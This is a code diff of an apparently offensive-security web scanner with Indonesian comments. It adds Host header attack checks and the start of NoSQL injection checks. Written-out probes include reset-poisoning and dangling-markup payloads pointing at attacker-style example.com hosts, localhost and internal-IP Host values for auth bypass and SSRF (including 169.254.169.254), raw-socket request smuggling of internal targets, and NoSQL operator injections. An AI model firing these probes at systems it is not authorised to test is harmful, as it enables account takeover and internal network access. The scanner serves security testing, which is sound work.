@@ -3929,174 +3929,476 @@ class SatriaBaruScanner:
         self._info_scan_auth_bypass(pages)
         self._info_scan_vcs(pages)
 
-    # ======================== HTTP Host header attacks (136-142, konservatif, bukti terverifikasi) ========================
+    # ======================== HTTP Host header attacks (136-142) ========================
+    # Semua bukti harus berasal dari respons target itu sendiri (in-band), bukan asumsi.
+    # Lab yang memerlukan akses kotak email (136/142) hanya dikonfirmasi jika host
+    # terkontrol benar-benar terpantul pada respons/lokasi redirect.
 
     def _host_mark(self, num: int, url: str, ev: str, method_name: str):
         point = Point(key=f"host-header-{num}", kind="endpoint", label=f"HTTP Host header attack {url}",
                       url=url, name="host-header", original="", page_url=url, method="GET", interest=8)
         self._mark(num, point, ev, method_name)
 
+    @staticmethod
+    def _host_denied(text: str) -> bool:
+        low = (text or "").lower()
+        return any(tok in low for tok in (
+            "only available to local users", "not available to local users",
+            "admin interface only available", "access denied", "not authorized",
+            "not authorised", "forbidden", "administrators only", "local users only"))
+
+    @staticmethod
+    def _host_admin(text: str) -> bool:
+        low = (text or "").lower()
+        if not low or "only available to local users" in low:
+            return False
+        if "admin panel" in low:
+            return True
+        markers = sum(1 for tok in ("delete user", "user management", "upgrade user",
+                                    "manage users", "administrator", "admin home") if tok in low)
+        if markers >= 2:
+            return True
+        return markers >= 1 and ("user" in low or "role" in low)
+
+    def _host_build_request(self, start_line: str, headers: list[tuple[str, str]], body: bytes = b"") -> bytes:
+        pu = urlparse(self.target_url)
+        default_host = pu.netloc or (pu.hostname or "")
+        lines = [start_line]
+        if not any(k.lower() == "host" for k, _ in headers):
+            lines.append(f"Host: {default_host}")
+        lines.extend(f"{k}: {v}" for k, v in headers)
+        lines.extend(["", ""])
+        return ("\r\n".join(lines)).encode("latin-1", "ignore") + (body or b"")
+
+    def _host_raw_exchange(self, requests_list: list[bytes], expect: int = 1,
+                           timeout: float | None = None) -> list[dict[str, Any]]:
+        """Kirim request HTTP/1.1 mentah; kembalikan respons terparse (mendukung pipelining)."""
+        import socket, ssl as _ssl, time as _time
+        pu = urlparse(self.target_url)
+        scheme = (pu.scheme or "http").lower()
+        host = pu.hostname or ""
+        port = pu.port or (443 if scheme == "https" else 80)
+        t = timeout if timeout is not None else max(4.0, min(12.0, float(getattr(self, "timeout", 8.0) or 8.0)))
+        if not host:
+            return []
+        try:
+            s = socket.create_connection((host, port), timeout=t)
+        except Exception:
+            return []
+        if scheme == "https":
+            try:
+                ctx = _ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = _ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=host)
+            except Exception:
+                try:
+                    s.close()
+                except Exception:
+                    pass
+                return []
+        buf = b""
+        try:
+            s.settimeout(t)
+            for raw in requests_list:
+                s.sendall(raw)
+            try:
+                s.shutdown(socket.SHUT_WR)
+            except Exception:
+                pass
+            deadline = _time.time() + t
+            while _time.time() < deadline:
+                try:
+                    s.settimeout(max(0.5, min(3.0, deadline - _time.time())))
+                    chunk = s.recv(8192)
+                except Exception:
+                    break
+                if not chunk:
+                    break
+                buf += chunk
+        except Exception:
+            pass
+        finally:
+            try:
+                s.close()
+            except Exception:
+                pass
+        return self._smug_parse_responses(buf)
+
+    def _host_targets(self, pages: list[Page]) -> list[str]:
+        pu = urlparse(self.target_url)
+        origin = f"{pu.scheme}://{pu.netloc}"
+        out = [urljoin(origin + "/", "admin"), urljoin(origin + "/", "admin/")]
+        for pg in pages[:12]:
+            u = getattr(pg, "url", "") or ""
+            if "admin" in u.lower() and u not in out and self._same_origin(u):
+                out.append(u)
+            for link in getattr(pg, "links", [])[:40]:
+                if "admin" in (link or "").lower() and self._same_origin(link) and link not in out:
+                    out.append(link)
+        return out[:4]
+
+    def _host_reset_targets(self, pages: list[Page]) -> list[tuple[str, str]]:
+        """(url, field) kandidat untuk alur reset password."""
+        pu = urlparse(self.target_url)
+        origin = f"{pu.scheme}://{pu.netloc}"
+        out: list[tuple[str, str]] = []
+        for pg in pages[:20]:
+            u = getattr(pg, "url", "") or ""
+            if any(k in u.lower() for k in ("forgot", "reset", "password")) and "change" not in u.lower():
+                out.append((u, "username"))
+            for form in getattr(pg, "forms", [])[:6]:
+                action = getattr(form, "action", "") or u
+                if any(k in (action or "").lower() for k in ("forgot", "reset", "password")) and "change" not in (action or "").lower():
+                    names = [n for n, _v, _t in getattr(form, "fields", [])[:8] if n]
+                    for guess in ("email", "username", "user"):
+                        if guess in names:
+                            out.append((action, guess))
+                            break
+                    else:
+                        if names:
+                            out.append((action, names[0]))
+        for fallback, field in ((urljoin(origin + "/", "forgot-password"), "email"),
+                                (urljoin(origin + "/", "forgot-password"), "username")):
+            if all(fallback != u for u, _ in out):
+                out.append((fallback, field))
+        return out[:6]
+
     def phase_http_host_header_attacks(self, pages: list[Page], points: list[Point]) -> None:
         if not self._within_budget():
             return
         import uuid as _uuid
-        target = self.target_url
-        pu = urlparse(target)
+        pu = urlparse(self.target_url)
         origin = f"{pu.scheme}://{pu.netloc}"
         legit_host = pu.netloc
-        evil_host = "evil-satria.example.com"
-        reset_urls = []
-        admin_urls = [urljoin(origin+"/","admin"), urljoin(origin+"/","login"), urljoin(origin+"/","my-account")]
-        for pg in pages[:20]:
-            u = getattr(pg,"url","") or ""; ul = u.lower()
-            if any(k in ul for k in ("forgot","reset","password")) and u not in reset_urls: reset_urls.append(u)
-            if any(k in ul for k in ("admin","login","account")) and u not in admin_urls: admin_urls.append(u)
-            for form in getattr(pg,"forms",[])[:6]:
-                a = getattr(form,"action","") or u; al = a.lower()
-                if any(k in al for k in ("forgot","reset","password")) and a not in reset_urls: reset_urls.append(a)
-        if not reset_urls: reset_urls = [urljoin(origin+"/","forgot-password"), urljoin(origin+"/","reset-password")]
+        marker = f"satria-host-{_uuid.uuid4().hex[:10]}"
+        evil_host = f"{marker}.example.com"
+        admin_urls = self._host_targets(pages)
+        reset_targets = self._host_reset_targets(pages)
 
-        # 136: Basic password reset poisoning
-        if 136 not in self._confirmed and self._within_budget():
-            for ru in reset_urls[:6]:
-                if 136 in self._confirmed or not self._within_budget(): break
-                params_names = ["username","email","user"]
-                for pg in pages[:10]:
-                    if getattr(pg,"url","")==ru:
-                        for f in getattr(pg,"forms",[])[:3]:
-                            for name,val,typ in getattr(f,"fields",[])[:6]:
-                                if name and name not in params_names: params_names.append(name)
-                for pn in params_names[:4]:
-                    if 136 in self._confirmed: break
-                    try:
-                        r = self._request("POST", ru, data={pn:"wiener"}, headers={"Host": evil_host, "X-Forwarded-Host": evil_host}, allow_redirects=True)
-                    except Exception: continue
-                    txt = getattr(r,"text","") or ""; hdrs = getattr(r,"headers",{}) or {}
-                    loc = str(hdrs.get("Location","") or hdrs.get("location","") or "")
-                    if evil_host in txt or evil_host in loc:
-                        self._host_mark(136, ru, f"Basic password reset poisoning terverifikasi: host terkontrol {evil_host!r} terefleksi dalam respons/link reset ({ru}).", "host_header_basic_reset_poisoning")
-                        break
-
-        # 137: Host header authentication bypass
+        # ---------- 137: Host header authentication bypass ----------
         if 137 not in self._confirmed and self._within_budget():
-            for au in admin_urls[:8]:
-                if 137 in self._confirmed or not self._within_budget(): break
-                try: r0 = self._request("GET", au, allow_redirects=True)
-                except Exception: continue
-                s0 = getattr(r0,"status",0) or 0; t0 = getattr(r0,"text","") or ""
-                if s0 not in (401,403,302,301,404): continue
-                for hh in ("localhost","127.0.0.1","localhost:80"):
-                    if 137 in self._confirmed: break
-                    try: r1 = self._request("GET", au, headers={"Host": hh}, allow_redirects=True)
-                    except Exception: continue
-                    s1 = getattr(r1,"status",0) or 0; t1 = getattr(r1,"text","") or ""
-                    if s1 == 200 and len(t1) > 60 and t1 != t0:
-                        self._host_mark(137, au, f"Host header authentication bypass terverifikasi: GET {au} dari {s0} -> 200 dengan Host: {hh} (konten berbeda).", "host_header_auth_bypass")
+            for au in admin_urls:
+                if 137 in self._confirmed or not self._within_budget():
+                    break
+                base = self._request("GET", au, allow_redirects=True)
+                if base.error:
+                    continue
+                b_text = base.text or ""
+                b_status = base.status or 0
+                denied = self._host_denied(b_text) or b_status in (401, 403)
+                if not denied:
+                    continue
+                for hh in ("localhost", "127.0.0.1", "localhost:80", "localhost:443"):
+                    if 137 in self._confirmed or not self._within_budget():
+                        break
+                    probe = self._request("GET", au, headers={"Host": hh}, allow_redirects=True)
+                    if probe.error or (probe.status or 0) != 200:
+                        continue
+                    p_text = probe.text or ""
+                    if self._host_admin(p_text) and not self._host_admin(b_text) and p_text != b_text:
+                        second = self._request("GET", au, headers={"Host": hh}, allow_redirects=True)
+                        if not second.error and self._host_admin(second.text or ""):
+                            self._host_mark(137, au,
+                                            f"Host header authentication bypass terverifikasi: GET {au} "
+                                            f"baseline HTTP {b_status} ({'denied' if denied else 'non-admin'}), "
+                                            f"dengan Host: {hh} -> HTTP {probe.status} dan konten panel admin "
+                                            f"({snippet(p_text, 90)!r}); direproduksi.",
+                                            "host_header_auth_bypass")
+                            break
+
+        # ---------- 139: routing-based SSRF ----------
+        if 139 not in self._confirmed and self._within_budget():
+            internal_hosts = ("192.168.0.1", "127.0.0.1", "localhost", "10.0.0.1", "169.254.169.254")
+            for au in admin_urls[:3]:
+                if 139 in self._confirmed or not self._within_budget():
+                    break
+                base = self._request("GET", au, allow_redirects=True)
+                if base.error:
+                    continue
+                b_text = base.text or ""
+                if self._host_admin(b_text):
+                    continue
+                for ih in internal_hosts:
+                    if 139 in self._confirmed or not self._within_budget():
+                        break
+                    probe = self._request("GET", au, headers={"Host": ih}, allow_redirects=True)
+                    if probe.error or (probe.status or 0) not in (200, 301, 302):
+                        continue
+                    p_text = probe.text or ""
+                    if self._host_admin(p_text) and p_text != b_text:
+                        self._host_mark(139, au,
+                                        f"Routing-based SSRF terverifikasi: GET {au} dengan Host: {ih} "
+                                        f"memberi HTTP {probe.status} dan konten internal/admin "
+                                        f"({snippet(p_text, 90)!r}) berbeda dari baseline.",
+                                        "host_header_routing_ssrf")
                         break
 
-        def _hit(h):
-            hl = {str(k).lower(): str(v).lower() for k,v in (h or {}).items()}
-            x = " ".join(hl.get(k,"") for k in ("x-cache","x-cache-status","cf-cache-status","x-cache-hits","cache-status","age"))
-            return ("hit" in x or "fresh" in x or "cached" in x or (hl.get('age','0').strip().isdigit() and int(hl.get('age','0').strip() or '0')>=1))
+        # ---------- 140: SSRF via flawed request parsing (absolute-form request target) ----------
+        if 140 not in self._confirmed and self._within_budget():
+            for au in admin_urls[:2]:
+                if 140 in self._confirmed or not self._within_budget():
+                    break
+                apath = urlparse(au).path or "/admin"
+                base_req = self._host_build_request(f"GET {apath} HTTP/1.1",
+                                                    [("Host", legit_host), ("Connection", "close")])
+                base_res = self._host_raw_exchange([base_req], 1)
+                b_text = base_res[0]["body"] if base_res else ""
+                if self._host_admin(b_text):
+                    continue
+                for ih in ("192.168.0.1", "127.0.0.1", "localhost"):
+                    if 140 in self._confirmed or not self._within_budget():
+                        break
+                    raw = self._host_build_request(f"GET http://{ih}{apath} HTTP/1.1",
+                                                   [("Host", legit_host), ("Connection", "close")])
+                    res = self._host_raw_exchange([raw], 1)
+                    if not res:
+                        continue
+                    r = res[0]
+                    if r["status"] == 200 and self._host_admin(r["body"]) and r["body"] != b_text:
+                        self._host_mark(140, au,
+                                        f"SSRF via flawed request parsing terverifikasi: request line "
+                                        f"'GET http://{ih}{apath}' -> HTTP 200 dengan konten internal/admin.",
+                                        "host_header_ssrf_flawed_parsing")
+                        break
 
-        # 138: Web cache poisoning via ambiguous requests
-        if 138 not in self._confirmed and self._within_budget():
-            for base in [target] + [getattr(pg,'url','') for pg in pages[:5] if getattr(pg,'url','')]:
-                if 138 in self._confirmed or not self._within_budget(): break
-                marker = f"satriahost138_{_uuid.uuid4().hex[:8]}"
+        # ---------- 141: Host validation bypass via connection state ----------
+        if 141 not in self._confirmed and self._within_budget():
+            for au in admin_urls[:2]:
+                if 141 in self._confirmed or not self._within_budget():
+                    break
+                apath = urlparse(au).path or "/admin"
+                b_status, b_body, _, _ = self._smug_normal_status(apath)
+                if self._host_admin(b_body):
+                    continue
+                for ih in ("192.168.0.1", "127.0.0.1", "localhost"):
+                    first = self._host_build_request("GET / HTTP/1.1",
+                                                     [("Host", legit_host), ("Connection", "keep-alive")])
+                    second = self._host_build_request(f"GET {apath} HTTP/1.1",
+                                                      [("Host", ih), ("Connection", "close")])
+                    r = None
+                    for _attempt in range(3):
+                        res = self._host_raw_exchange([first, second], 2)
+                        if len(res) >= 2 and res[1]["status"] == 200 and self._host_admin(res[1]["body"]):
+                            r = res[1]
+                            break
+                    if r is not None and self._host_admin(r["body"]):
+                        self._host_mark(141, au,
+                                        f"Host validation bypass via connection state terverifikasi: request "
+                                        f"kedua (Host: {ih}) pada koneksi yang sama -> HTTP 200 dengan konten "
+                                        f"admin ({snippet(r['body'], 90)!r}).",
+                                        "host_header_connection_state_bypass")
+                        break
+
+        # ---------- 136: basic password reset poisoning ----------
+        if 136 not in self._confirmed and self._within_budget():
+            for ru, field in reset_targets:
+                if 136 in self._confirmed or not self._within_budget():
+                    break
+                data = {field: "wiener"}
                 try:
-                    pr = self._request("GET", base, headers={"Host": legit_host, "X-Forwarded-Host": f"evil-{marker}.example.com"}, allow_redirects=True)
-                    cr = self._request("GET", base, allow_redirects=True)
-                except Exception: continue
-                ptxt=getattr(pr,'text','') or ''; ctxt=getattr(cr,'text','') or ''
-                ph=getattr(pr,'headers',{}) or {}; ch=getattr(cr,'headers',{}) or {}
-                if marker and (marker in ptxt or any(marker in str(v) for v in ph.values())) and (marker in ctxt or any(marker in str(v) for v in ch.values())) and (_hit(ch) or _hit(ph)):
-                    self._host_mark(138, base, f"Web cache poisoning via ambiguous Host request terverifikasi pada {base}: marker tercemar & ter-cache.", "host_header_cache_poisoning_ambiguous")
+                    base = self._request("POST", ru, data=data, allow_redirects=True)
+                except Exception:
+                    continue
+                if base.error:
+                    continue
+                b_text = base.text or ""
+                b_loc = str((base.headers or {}).get("Location") or (base.headers or {}).get("location") or "")
+                b_flow = any(tok in (b_text + b_loc).lower() for tok in
+                             ("email", "reset", "sent", "link", "check your inbox"))
+                for hdrs in ({"Host": evil_host}, {"Host": evil_host, "X-Forwarded-Host": evil_host},
+                             {"X-Forwarded-Host": evil_host}):
+                    if 136 in self._confirmed or not self._within_budget():
+                        break
+                    probe = self._request("POST", ru, data=data, headers=hdrs, allow_redirects=True)
+                    if probe.error:
+                        continue
+                    p_text = probe.text or ""
+                    p_loc = str((probe.headers or {}).get("Location") or (probe.headers or {}).get("location") or "")
+                    reflected = evil_host in (p_text + p_loc) and evil_host not in (b_text + b_loc)
+                    if reflected and b_flow:
+                        second = self._request("POST", ru, data=data, headers=hdrs, allow_redirects=True)
+                        if not second.error and evil_host in ((second.text or "") +
+                                                              str((second.headers or {}).get("Location") or "")):
+                            self._host_mark(136, ru,
+                                            f"Basic password reset poisoning terverifikasi: host terkontrol "
+                                            f"{evil_host!r} terpantul pada respons/lokasi reset {ru} "
+                                            f"(field {field}), tidak ada pada baseline; direproduksi.",
+                                            "host_header_basic_reset_poisoning")
+                            break
+
+        # ---------- 138: web cache poisoning via ambiguous requests ----------
+        if 138 not in self._confirmed and self._within_budget():
+            candidates = [self.target_url] + [getattr(pg, "url", "") for pg in pages[:4] if getattr(pg, "url", "")]
+            for base_url in candidates[:4]:
+                if 138 in self._confirmed or not self._within_budget():
+                    break
+                tag = f"satria-cache-{_uuid.uuid4().hex[:10]}"
+                host_val = f"{tag}.example.com"
+                poison = self._request("GET", base_url,
+                                       headers={"Host": legit_host, "X-Forwarded-Host": host_val},
+                                       allow_redirects=True)
+                if poison.error or tag not in (poison.text or ""):
+                    continue
+                plain = self._request("GET", base_url, allow_redirects=True)
+                if plain.error or tag not in (plain.text or ""):
+                    continue
+                headers = {str(k).lower(): str(v).lower() for k, v in (plain.headers or {}).items()}
+                cache_signal = " ".join(headers.get(k, "") for k in
+                                        ("x-cache", "x-cache-status", "cf-cache-status", "age", "x-proxy-cache"))
+                if cache_signal.strip():
+                    self._host_mark(138, base_url,
+                                    f"Web cache poisoning via ambiguous Host request terverifikasi pada "
+                                    f"{base_url}: nilai {host_val!r} tercemar pada respons ter-cache "
+                                    f"(cache={cache_signal.strip()[:70]!r}).",
+                                    "host_header_cache_poisoning_ambiguous")
                     break
 
-        # 139: Routing-based SSRF
-        if 139 not in self._confirmed and self._within_budget():
-            try: b = self._request("GET", target, allow_redirects=True); btxt = getattr(b,'text','') or ''
-            except Exception: btxt = ""
-            for ih in ("127.0.0.1","localhost","192.168.0.1","10.0.0.1","169.254.169.254"):
-                if 139 in self._confirmed or not self._within_budget(): break
-                for hdr in ({"Host": ih}, {"X-Forwarded-Host": ih}):
-                    if 139 in self._confirmed: break
-                    try: r = self._request("GET", target, headers=hdr, allow_redirects=True)
-                    except Exception: continue
-                    txt = getattr(r,'text','') or ''; st = getattr(r,'status',0) or 0
-                    if txt != btxt and st in (200,301,302):
-                        for im in (re.compile(r"ami-id|instance-id|meta-data", re.I), re.compile(r"root:.*:0:0:", re.I), re.compile(r"Apache Server Status|Server Information", re.I)):
-                            if im.search(txt) and not im.search(btxt):
-                                self._host_mark(139, target, f"Routing-based SSRF terverifikasi (Host header {hdr}): konten internal ({im.pattern!r}) berbeda dari baseline.", "host_header_routing_ssrf")
-                                break
-
-        # 140: SSRF via flawed request parsing
-        if 140 not in self._confirmed and self._within_budget():
-            try: b = self._request("GET", target, allow_redirects=True); btxt = getattr(b,'text','') or ''
-            except Exception: btxt = ""
-            for ih in ("127.0.0.1","localhost","169.254.169.254"):
-                if 140 in self._confirmed or not self._within_budget(): break
-                try: r = self._request("GET", target, headers={"Host": ih}, allow_redirects=True)
-                except Exception: continue
-                txt = getattr(r,'text','') or ''; st = getattr(r,'status',0) or 0
-                if txt and txt != btxt and st in (200,301,302):
-                    for im in (re.compile(r"ami-id|instance-id|meta-data", re.I), re.compile(r"root:.*:0:0:", re.I)):
-                        if im.search(txt) and not im.search(btxt):
-                            self._host_mark(140, target, f"SSRF via flawed request parsing terverifikasi (Host->{ih}): konten internal ({im.pattern!r}).", "host_header_ssrf_flawed_parsing")
-                            break
-
-        # 141: Host validation bypass via connection state attack
-        if 141 not in self._confirmed and self._within_budget():
-            import socket, ssl as _ssl
-            try:
-                scheme = pu.scheme or "http"; port = pu.port or (443 if scheme=="https" else 80); h = pu.hostname or ""
-                s = socket.create_connection((h, port), timeout=max(5.0, float(getattr(self,'timeout',8.0) or 8.0)))
-                if scheme=="https":
-                    ctx=_ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=_ssl.CERT_NONE
-                    s=ctx.wrap_socket(s, server_hostname=h)
-                s.settimeout(max(5.0, float(getattr(self,'timeout',8.0) or 8.0)))
-                s.sendall((f"GET / HTTP/1.1\r\nHost: {legit_host}\r\nConnection: keep-alive\r\n\r\n").encode())
-                try: s.recv(65536)
-                except Exception: pass
-                s.sendall((f"GET /admin HTTP/1.1\r\nHost: 192.168.0.1\r\nConnection: close\r\n\r\n").encode())
-                data=b""
-                try:
-                    while True:
-                        chunk=s.recv(4096)
-                        if not chunk: break
-                        data+=chunk
-                        if b"\r\n\r\n" in data and len(data)>64: break
-                except Exception: pass
-                try: s.close()
-                except Exception: pass
-                m = re.search(br"HTTP/\d\.\d\s+(\d+)", data); status = int(m.group(1)) if m else None
-                body = data.split(b"\r\n\r\n",1)[1] if b"\r\n\r\n" in data else b""
-                if status == 200 and (b"admin" in body.lower() or b"dashboard" in body.lower()) and len(body) > 80:
-                    self._host_mark(141, target, "Host validation bypass via connection state attack terverifikasi: request kedua (Host internal) pada koneksi reuse mendapat HTTP 200 dengan konten sensitif.", "host_header_connection_state_bypass")
-            except Exception: pass
-
-        # 142: Password reset poisoning via dangling markup
+        # ---------- 142: dangling markup reset poisoning ----------
         if 142 not in self._confirmed and self._within_budget():
-            dangling_hosts = [legit_host + ":'<a href=\"//evil-satria.example.com/?", "evil-satria.example.com:'<a href=\"//evil-satria.example.com/?", legit_host + "@evil-satria.example.com"]
-            for ru in reset_urls[:6]:
-                if 142 in self._confirmed or not self._within_budget(): break
-                for dh in dangling_hosts:
-                    if 142 in self._confirmed: break
-                    for pn in ("username","email","user"):
-                        if 142 in self._confirmed: break
-                        try:
-                            r = self._request("POST", ru, data={pn:"wiener"}, headers={"Host": dh, "X-Forwarded-Host": dh}, allow_redirects=True)
-                        except Exception: continue
-                        txt = getattr(r,"text","") or ""; hdrs = getattr(r,"headers",{}) or {}
-                        loc = str(hdrs.get("Location","") or hdrs.get("location","") or "")
-                        if ("evil-satria.example.com" in txt or "evil-satria.example.com" in loc) and ("href" in txt.lower() or "<a" in txt.lower() or "reset" in txt.lower() or "evil-satria.example.com" in loc):
-                            self._host_mark(142, ru, f"Password reset poisoning via dangling markup terverifikasi: payload host {dh!r} terefleksi dalam respons reset ({ru}).", "host_header_dangling_markup")
-                            break
+            dangling = [
+                legit_host + ":'<a href=\"//" + evil_host + "/?",
+                evil_host + ":'<a href=\"//" + evil_host + "/?",
+                legit_host + "@" + evil_host,
+                legit_host + ":'<script src=\"//" + evil_host + "/x\">",
+            ]
+            for ru, field in reset_targets[:4]:
+                if 142 in self._confirmed or not self._within_budget():
+                    break
+                data = {field: "wiener"}
+                base = self._request("POST", ru, data=data, allow_redirects=True)
+                if base.error:
+                    continue
+                b_all = (base.text or "") + str((base.headers or {}).get("Location") or "")
+                for dh in dangling:
+                    if 142 in self._confirmed or not self._within_budget():
+                        break
+                    probe = self._request("POST", ru, data=data, headers={"Host": dh,
+                                                                         "X-Forwarded-Host": dh},
+                                          allow_redirects=True)
+                    if probe.error:
+                        continue
+                    p_all = (probe.text or "") + str((probe.headers or {}).get("Location") or "")
+                    low = p_all.lower()
+                    if evil_host in p_all and evil_host not in b_all and any(
+                            tok in low for tok in ("href", "<a", "<script", "reset", "token")):
+                        self._host_mark(142, ru,
+                                        f"Password reset poisoning via dangling markup terverifikasi: payload "
+                                        f"host {dh!r} terpantul utuh pada respons reset {ru} ({snippet(p_all, 100)!r}).",
+                                        "host_header_dangling_markup")
+                        break
 
+    # ======================== NoSQL injection (143-146) ========================
+    # Basis bukti:
+    #  - error-based: pesan Mongo/BSON/operator yang muncul hanya pada payload injeksi
+    #  - auth bypass: bentuk operator ($ne/$regex) benar-benar mengubah hasil login
+    #  - ekstraksi: oracle boolean $regex diekstrak (binary search) dan diverifikasi
+    #  - $where: ekspresi server-side JS true/false memberi hasil berbeda yang konsisten
+    # Semua sinyal wajib berbeda dari baseline dan diulang agar tidak false positive.
 
+    _NOSQL_ERROR_PATTERNS: tuple[str, ...] = (
+        r"MongoError", r"MongoServerError", r"BSONError", r"E11000 duplicate key",
+        r"unknown (?:top level )?operator", r"Unrecognized pipeline stage",
+        r"Cast to ObjectId failed", r"Cannot create field", r"Unterminated string",
+        r"SyntaxError: Unexpected token", r"pymongo", r"mongoose", r"MongoDB",
+        r"invalid operator", r"Failed to parse", r"TypeError: Cannot read propert",
+        r"cannot be applied to a field", r"cannot index into a null array",
+        r"Unrecognized expression", r"unterminated string literal",
+    )
 
-    # ======================== NoSQL injection (143-146, konservatif, bukti terverifikasi) ========================
+    @classmethod
+    def _nosql_error(cls, text: str) -> str:
+        body = (text or "")[:200_000]
+        for pattern in cls._NOSQL_ERROR_PATTERNS:
+            match = re.search(pattern, body, re.I)
+            if match:
+                return match.group(0)[:90]
+        return ""
+
+    @staticmethod
+    def _nosql_success(resp: "Response | None") -> bool:
+        if resp is None or resp.error:
+            return False
+        headers = {str(k).lower(): str(v) for k, v in (resp.headers or {}).items()}
+        loc = headers.get("location", "").lower()
+        if resp.status in (301, 302, 303, 307, 308):
+            if any(tok in loc for tok in ("my-account", "account", "profile", "dashboard", "admin")) \
+                    and "login" not in loc:
+                return True
+        low = (resp.text or "").lower()
+        return any(tok in low for tok in (
+            "log out", "logout", "sign out", "your username is", "your email is",
+            "my account", "account details"))
+
+    @staticmethod
+    def _nosql_failed(resp: "Response | None") -> bool:
+        if resp is None or resp.error:
+            return False
+        low = (resp.text or "").lower()
+        return any(tok in low for tok in (
+            "invalid username", "invalid password", "incorrect", "login failed",
+            "invalid credentials", "wrong password", "not found", "does not exist"))
+
+    def _nosql_login_state(self, action: str):
+        """Ambil field default form login (termasuk token CSRF) langsung dari halaman."""
+        cache = getattr(self, "_nosql_states", None)
+        if cache is None:
+            cache = {}
+            self._nosql_states = cache
+        if action in cache:
+            return cache[action]
+        cache[action] = None
+        page = self._request("GET", action, allow_redirects=True)
+        if page.error or not page.text:
+            return None
+        try:
+            soup = BeautifulSoup(page.text, "html.parser")
+        except Exception:
+            return None
+        form = None
+        for candidate in soup.find_all("form"):
+            if candidate.find("input", {"type": "password"}):
+                form = candidate
+                break
+        if form is None:
+            return None
+        defaults: dict[str, str] = {}
+        for inp in form.find_all("input"):
+            name = inp.get("name")
+            if not name:
+                continue
+            typ = (inp.get("type") or "text").lower()
+            if typ in {"submit", "button", "image", "reset", "file", "checkbox", "radio"}:
+                continue
+            defaults[name] = str(inp.get("value") or "")
+        user_field = next((n for n in defaults if n.lower() in ("username", "email", "user", "login")), "")
+        pass_field = next((n for n in defaults if "pass" in n.lower()), "")
+        if not pass_field:
+            pw = form.find("input", {"type": "password"})
+            pass_field = str(pw.get("name") or "") if pw else ""
+        if not user_field or not pass_field:
+            return None
+        submit = urljoin(page.url, form.get("action") or page.url)
+        state = (defaults, user_field, pass_field, submit)
+        cache[action] = state
+        return state
+
+    def _nosql_form_actions(self, pages: list[Page]) -> list[str]:
+        pu = urlparse(self.target_url)
+        origin = f"{pu.scheme}://{pu.netloc}"
+        actions: list[str] = []
+        for pg in pages[:20]:
+            for form in getattr(pg, "forms", [])[:8]:
+                names = [n for n, _v, _t in getattr(form, "fields", [])[:10] if n]
+                if not (getattr(form, "has_password", False) or any("pass" in (n or "").lower() for n in names)):
+                    continue
+                action = getattr(form, "action", "") or getattr(pg, "url", "")
+                if action and self._same_origin(action) and action not in actions:
+                    actions.append(action)
+        for fallback in (urljoin(origin + "/", "login"), urljoin(origin + "/", "signin")):
+            if fallback not in actions:
+                actions.append(fallback)
+        return actions[:4]
 
     def _nosql_mark(self, num: int, url: str, ev: str, method_name: str):
         point = Point(key=f"nosql-{num}", kind="endpoint", label=f"NoSQL injection {url}",
@@ -4107,189 +4409,198 @@ class SatriaBaruScanner:
         if not self._within_budget():
             return
         import json as _json
-        target = self.target_url
-        pu = urlparse(target)
+        pu = urlparse(self.target_url)
         origin = f"{pu.scheme}://{pu.netloc}"
+        user_value = (os.getenv("SATRIA_USERNAME") or "").strip() or "carlos"
+        token = uuid.uuid4().hex[:8]
 
-        # kumpulkan kandidat endpoint/param (login/json/form)
-        cand = []  # (url, method, param_name, is_json_like)
-        seen_c = set()
-        def add_c(url, method, name, is_json):
-            k = (url, method.upper(), name, is_json)
-            if k in seen_c: return
-            seen_c.add(k); cand.append(k)
-        for pg in pages[:25]:
-            u = getattr(pg,'url','') or ''
-            for form in getattr(pg,'forms',[])[:8]:
-                a = getattr(form,'action','') or u or target
-                m = (getattr(form,'method','GET') or 'GET').upper()
-                for name,val,typ in getattr(form,'fields',[])[:8]:
-                    if name: add_c(a,m,name,False)
-                # heuristik login/auth
-                al = (a or '').lower()
-                if any(x in al for x in ('login','signin','auth','session')):
-                    add_c(a,m,'username',False); add_c(a,m,'password',False)
-        for p in points[:30]:
-            try:
-                add_c(getattr(p,'url',target), getattr(p,'method','GET') or 'GET', getattr(p,'name','id') or 'id', False)
-            except Exception: pass
-        if not cand:
-            add_c(target,'GET','id',False)
-
-        nosql_err = re.compile(r"MongoError|MongoServerError|BSON|Unrecognized pipeline stage|unknown (?:top level )?operator|\$where|\$regex|\$ne|\$gt|\$nin|unterminated string literal|SyntaxError:|E11000|pymongo|mongoose|Cannot create field|Object representing the BSON", re.I)
-
-        # 143: Detecting NoSQL injection
+        # ---------- 143: deteksi error-based pada parameter query/form ----------
         if 143 not in self._confirmed and self._within_budget():
-            for url, method, name, is_json in cand[:40]:
-                if 143 in self._confirmed or not self._within_budget(): break
+            probes = ["'", "\"", "\\", "'||'1'=='1", "';return true;var x='", "{\"$ne\":\"\"}"]
+            count = 0
+            for point in points:
+                if 143 in self._confirmed or not self._within_budget() or count >= 10:
+                    break
+                if point.kind not in ("query", "form"):
+                    continue
+                count += 1
                 try:
-                    b = self._request(method, url, params={name:'test'} if method=='GET' else None, data={name:'test'} if method!='GET' else None, allow_redirects=True)
-                except Exception: b = None
-                btxt = getattr(b,'text','') or '' if b else ''
-                bst = getattr(b,'status',0) or 0 if b else 0
-                probes = [
-                    {name: "test'"},
-                    {name: 'test"'},
-                    {name: "test'\\"},
-                    {name: "test' || '1'=='1"},
-                ]
-                for pv in probes:
-                    if 143 in self._confirmed or not self._within_budget(): break
-                    try:
-                        r = self._request(method, url, params=pv if method=='GET' else None, data=pv if method!='GET' else None, allow_redirects=True)
-                    except Exception: continue
-                    txt = getattr(r,'text','') or ''; st = getattr(r,'status',0) or 0
-                    if nosql_err.search(txt) and not nosql_err.search(btxt):
-                        self._nosql_mark(143, url, f"NoSQL injection terdeteksi (error-based) pada {url} param {name}: pesan/indikator NoSQL muncul ({nosql_err.search(txt).group(0)[:80]!r}) berbeda dari baseline.", "nosql_detecting")
+                    base = self.send(point, "satria_nosql_probe")
+                except Exception:
+                    continue
+                if base.error:
+                    continue
+                base_sig = self._nosql_error(base.text)
+                for payload in probes:
+                    if 143 in self._confirmed or not self._within_budget():
                         break
-                # boolean/differential (syntax) sederhana
-                if 143 not in self._confirmed and self._within_budget():
                     try:
-                        rt = self._request(method, url, params={name:"'||'1'=='1"} if method=='GET' else None, data={name:"'||'1'=='1"} if method!='GET' else None, allow_redirects=True)
